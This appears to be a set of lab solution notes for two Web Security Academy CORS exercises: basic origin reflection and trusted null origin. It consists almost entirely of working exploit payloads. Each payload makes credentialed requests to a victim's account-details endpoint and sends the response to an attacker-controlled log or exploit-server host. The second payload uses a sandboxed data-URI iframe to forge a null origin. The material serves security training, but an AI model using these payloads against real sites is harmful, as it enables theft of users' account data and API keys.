## 1. CORS vulnerability with basic origin reflection

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://0a60009e03d6438180bbf31e00fa0095.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?text='+this.responseText;
   };
</script>
```

## 2. CORS vulnerability with trusted null origin

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0ad6000c040dd78781eb430f00a200f9.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-0a5d00ac04f5d75c81f242b5016000a0.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
